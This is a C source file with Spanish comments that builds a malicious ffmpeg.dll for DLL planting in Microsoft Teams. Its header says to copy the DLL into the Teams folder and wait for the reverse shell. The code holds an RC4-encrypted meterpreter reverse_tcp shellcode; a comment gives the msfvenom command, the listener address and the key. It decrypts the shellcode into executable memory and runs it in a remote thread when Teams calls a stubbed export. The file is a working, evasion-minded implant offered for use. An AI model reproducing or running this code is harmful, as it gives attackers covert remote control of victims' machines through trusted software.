/*
    Compilar como DLL y nombrar ffmpeg.dll
    gcc -shared dll-planting-tcp -o ffmpeg.dll

    Detener Microsoft Teams, copiar la dll en
    C:\Users\[usuario]\AppData\Local\Microsoft\Teams\current

    Volver a ejecutar Teams y esperar la shell reversa
*/

#include <stdio.h>
#include <windows.h>

void alert(char *msg) {
     MessageBoxA( NULL, msg, "Fatal error", MB_OK );
}
BOOL WINAPI av_buffer_create() { alert("av_buffer_create"); return 0; }
BOOL WINAPI av_buffer_get_opaque() { alert("av_buffer_get_opaque"); return 0; }
BOOL WINAPI av_dict_count() { alert("av_dict_count"); return 0; }
BOOL WINAPI av_dict_free() { alert("av_dict_free"); return 0; }
BOOL WINAPI av_dict_get() { alert("av_dict_get"); return 0; }
BOOL WINAPI av_dict_set() { alert("av_dict_set"); return 0; }
BOOL WINAPI av_force_cpu_flags() { alert("av_force_cpu_flags"); return 0; }
BOOL WINAPI av_frame_alloc() { alert("av_frame_alloc"); return 0; }
BOOL WINAPI av_frame_clone() { alert("av_frame_clone"); return 0; }
BOOL WINAPI av_frame_free() { alert("av_frame_free"); return 0; }
BOOL WINAPI av_frame_unref() { alert("av_frame_unref"); return 0; }
BOOL WINAPI av_free() { alert("av_free"); return 0; }
BOOL WINAPI av_get_bytes_per_sample() { alert("av_get_bytes_per_sample"); return 0; }
BOOL WINAPI av_image_check_size() { alert("av_image_check_size"); return 0; }
BOOL WINAPI av_init_packet() { alert("av_init_packet"); return 0; }
BOOL WINAPI av_log_set_level() { alert("av_log_set_level"); return 0; }
BOOL WINAPI av_malloc() { alert("av_malloc"); return 0; }
BOOL WINAPI av_max_alloc() { alert("av_max_alloc"); return 0; }
BOOL WINAPI av_new_packet() { alert("av_new_packet"); return 0; }
BOOL WINAPI av_packet_copy_props() { alert("av_packet_copy_props"); return 0; }
BOOL WINAPI av_packet_get_side_data() { alert("av_packet_get_side_data"); return 0; }
BOOL WINAPI av_packet_unref() { alert("av_packet_unref"); return 0; }
BOOL WINAPI av_rdft_calc() { alert("av_rdft_calc"); return 0; }
BOOL WINAPI av_rdft_end() { alert("av_rdft_end"); return 0; }
BOOL WINAPI av_rdft_init() { alert("av_rdft_init"); return 0; }
BOOL WINAPI av_read_frame() { alert("av_read_frame"); return 0; }
BOOL WINAPI av_rescale_q() { alert("av_rescale_q"); return 0; }
BOOL WINAPI av_samples_get_buffer_size() { alert("av_samples_get_buffer_size"); return 0; }
BOOL WINAPI av_seek_frame() { alert("av_seek_frame"); return 0; }
BOOL WINAPI av_strerror() { alert("av_strerror"); return 0; }
BOOL WINAPI avcodec_align_dimensions() { alert("avcodec_align_dimensions"); return 0; }
BOOL WINAPI avcodec_alloc_context3() { alert("avcodec_alloc_context3"); return 0; }
BOOL WINAPI avcodec_decode_video2() { alert("avcodec_decode_video2"); return 0; }
BOOL WINAPI avcodec_descriptor_get() { alert("avcodec_descriptor_get"); return 0; }
BOOL WINAPI avcodec_descriptor_next() { alert("avcodec_descriptor_next"); return 0; }
BOOL WINAPI avcodec_find_decoder() { alert("avcodec_find_decoder"); return 0; }
BOOL WINAPI avcodec_flush_buffers() { alert("avcodec_flush_buffers"); return 0; }
BOOL WINAPI avcodec_free_context() { alert("avcodec_free_context"); return 0; }
BOOL WINAPI avcodec_get_name() { alert("avcodec_get_name"); return 0; }
BOOL WINAPI avcodec_open2() { alert("avcodec_open2"); return 0; }
BOOL WINAPI avcodec_parameters_to_context() { alert("avcodec_parameters_to_context"); return 0; }
BOOL WINAPI avcodec_receive_frame() { alert("avcodec_receive_frame"); return 0; }
BOOL WINAPI avcodec_send_packet() { alert("avcodec_send_packet"); return 0; }
BOOL WINAPI avformat_alloc_context() { alert("avformat_alloc_context"); return 0; }
BOOL WINAPI avformat_close_input() { alert("avformat_close_input"); return 0; }
BOOL WINAPI avformat_find_stream_info() { alert("avformat_find_stream_info"); return 0; }
BOOL WINAPI avformat_free_context() { alert("avformat_free_context"); return 0; }
BOOL WINAPI avformat_open_input() { alert("avformat_open_input"); return 0; }
BOOL WINAPI avio_alloc_context() { alert("avio_alloc_context"); return 0; }
BOOL WINAPI avio_close() { alert("avio_close"); return 0; }





#define ARRAY_LENGTH	256

unsigned char s[ARRAY_LENGTH];
int rc4_i;
int rc4_j;

void swap(unsigned char *s1, unsigned char *s2)
{
	char temp = *s1;

	*s1 = *s2;
	*s2 = temp;
}


int InitRC4(void)
{
	int i;

	for(i=0 ; i< ARRAY_LENGTH; i++)
		s[i] = i;

	rc4_i = rc4_j = 0;

	return 1;
}

int DoKSA(unsigned char *key, int key_len)
{

	for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
		swap(&s[rc4_i], &s[rc4_j]);
	}
	
	rc4_i = rc4_j = 0;

}


char GetPRGAOutput(void)
{
	rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;

	rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;

	swap(&s[rc4_i], &s[rc4_j]);

	return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
}

int CSA() {
    int proceso = GetCurrentProcessId();

    HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, proceso);
    
    if (p == NULL) {
        MessageBoxA( NULL, "Error al obtener el manejador del proceso", "Fatal error", MB_OK );
        return 0;
    }

    //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.147.139 LPORT=443 --encrypt rc4 --encrypt-key inc0d3 -f c
   
    unsigned char payload[] = 
                                "\x88\xa1\x26\x40\xb5\x38\xd1\xcc\xf0\x6f\x95\x33\x33\x24\x60"
                                "\x97\xfb\x45\x88\xe2\x99\xa1\xce\xdb\xd0\x39\x07\x97\x0d\xe9"
                                "\x6a\x1a\x81\x59\x97\xe4\xee\x10\x4e\x36\x26\x3d\x3e\x94\x29"
                                "\x04\x22\x56\xbb\xba\x7f\xad\x63\xdc\x13\xfc\x34\x48\x6d\x98"
                                "\xf6\xca\xc0\xc0\xe6\xab\xc1\x41\x61\x52\x96\xcf\x6a\x4e\x1b"
                                "\x5c\xee\x41\x46\xde\x6e\x55\x67\xed\x28\xad\x20\x9f\xbf\x79"
                                "\x6c\xb1\x78\x89\xd0\xb9\xe0\x24\xf5\xd9\xb6\xd5\x17\xe5\x9d"
                                "\xa1\xf3\xed\xf4\xdc\x49\x0e\xdd\xb4\x14\x14\x87\x05\xb3\xef"
                                "\xa6\x21\x3e\xfc\xf7\x8e\x59\xba\x6c\xca\x4c\x68\xc0\x80\xe7"
                                "\x45\x11\x73\xe1\x6b\x52\x7d\xad\xfd\xe3\xae\x0a\x00\xe8\x1f"
                                "\x4b\x1f\x37\xab\x28\x15\x51\x88\x32\x79\x1c\x5b\x03\xd1\x5d"
                                "\x57\x88\x28\x20\x13\x09\xb1\xe8\xe4\x55\x63\xc9\x7b\x50\x31"
                                "\x6f\x71\x09\xa0\x67\xfb\xa8\x90\x77\xdc\x6a\x7c\x64\x5e\x2c"
                                "\x64\x3b\xfc\x4b\xde\x57\x16\xe0\xb1\xec\x5a\x03\x96\x87\x07"
                                "\xd9\x39\xae\x54\x71\x56\xed\x33\xca\x9b\x3d\x91\x38\x3e\x49"
                                "\x72\xbb\xd0\x85\xeb\x7e\x89\x54\xf1\x1f\x40\x3a\x11\xf2\x4a"
                                "\x9e\x98\xd6\x60\x26\x33\x64\xd1\x49\x53\x5d\xdf\x69\xaa\x83"
                                "\x3e\xcf\xbe\xe6\x43\x90\x87\x2a\xd4\xfd\x93\x00\xed\x34\x0e"
                                "\x22\xde\x30\xbc\xc3\xa4\x6a\x2b\xfe\xea\xe3\x7a\x74\x58\x68"
                                "\x52\x70\x00\x11\x9a\xf6\x0b\x83\xa6\xa9\xff\x4c\x25\xcf\x6c"
                                "\x77\x95\x08\xff\x1f\xa4\xb8\x31\x5c\x4b\x6d\x01\x40\x69\x66"
                                "\x0f\x93\xed\xa4\xf7\x63\x25\x7a\xf6\xec\x8e\x1b\x02\x2b\x6e"
                                "\x83\x9e\x9b\x7f\xde\xab\x18\x14\xdd\xbc\xd2\xe7\xdf\x8b\x13"
                                "\x78\xa3\x38\xe7\x46\x44\xcd\xab\x40\x4f\x3d\xac\xc0\x5b\xd2"
                                "\x0b\xb0\x72\x54\xdb\x1e\xf4\x81\x14\xcc\x65\xd3\x78\x7d\x57"
                                "\xb9\x59\xaa\xd7\x87\x40\xc9\x7a\xfe\x68\x99\x1a\xfc\x4b\xea"
                                "\x22\x4f\xcb\x70\xff\xfc\xc2\xc7\x47\x47\x5e\x7c\xbe\x34\x6f"
                                "\xdd\x6d\xf0\x74\xa4\xa8\x39\xc1\x2f\x41\xbf\xa6\x63\x65\x90"
                                "\x3d\xf3\xd8\x83\xbf\x9c\x7d\x3d\xb9\x70\x7e\x5f\x99\x06\x97"
                                "\xae\xbc\xf3\x1a\x47\x95\xe7\x7f\xcc\x20\xca\x77\x9f\x34\xe4"
                                "\x48\x01\x44\x81\x77\x05\xf1\xb2\x95\xbd\x36\xf2\xc8\xde\xc4"
                                "\x57\x34\x90\x9e\xf8\x23\xd2\xad\x91\x79\x21\xf5\x26\x9e\xa3"
                                "\xdb\x72\x02\xda\xd8\xbe\x2b\xc7\xa9\x6b\x3d\x25\x54\xad\x67"
                                "\x8c\x08\x3f\x07\x0d\x44\xfd\x11\x8e\x65\xb4\x53\x79\x52\x49";

    unsigned char keystream_byte;

    InitRC4();
	
	DoKSA("inc0d3", 6);   

    LPVOID memoria = VirtualAllocEx(p, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
    if (memoria == NULL) {
        MessageBoxA( NULL, "Error al obtener memoria", "Fatal error", MB_OK );
        return 0;
    }   

    for(size_t i = 0, len = sizeof(payload) - 1; i < len; i++) {
        keystream_byte = GetPRGAOutput();
        payload[i] = payload[i] ^ keystream_byte;        
    }
    
    BOOL result = WriteProcessMemory(p, memoria, payload, sizeof(payload), NULL);

    if (result == FALSE) {
        MessageBoxA( NULL, "Error al escribir la shellcode", "Fatal error", MB_OK );
        return 0;
    }  

    //((void(*)())memoria)();  
   
    HANDLE remoteThread = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)memoria, NULL, 0, NULL);

    if (remoteThread == NULL) {
        MessageBoxA( NULL, "Error al crear el hilo", "Fatal error", MB_OK );
        return 0;
    }    

    WaitForSingleObject(remoteThread, INFINITE);                      

    return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL,  DWORD fdwReason,  LPVOID lpReserved ){
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
           		
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE; 
}

BOOL WINAPI av_get_cpu_flags() { 

    CSA();

}